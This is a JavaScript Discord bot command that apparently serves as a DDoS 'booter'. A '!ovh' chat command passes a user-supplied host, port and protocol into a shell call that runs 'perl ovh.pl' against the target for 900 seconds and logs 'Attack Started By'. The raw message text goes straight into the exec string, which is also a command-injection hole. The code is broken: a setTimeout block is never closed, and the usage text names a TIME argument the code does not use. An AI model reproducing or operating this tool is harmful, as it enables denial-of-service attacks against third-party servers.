const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Error')
	.setDescription("`!ovh {HOST} {PORT} {TIME}`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('Error')
	.setTitle('!ovh {HOST} {PORT} {TIME}')
	.setDescription("``")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('Error')
	.setTitle('!ovh {HOST} {PORT} {TIME}')
	.setDescription("``")
	message.channel.send(embed1);
	return;
	}
	
  
var exec = require('child_process').exec
exec(`perl ovh.pl ${host} ${port} 900 ${protocol}`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack Started By: ' +  message.guild.id)



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['ovh'],
  permLevel: 0
}

exports.help = {
  name: 'ovh',
  description: 'Özel',
  usage: 'ovh'
}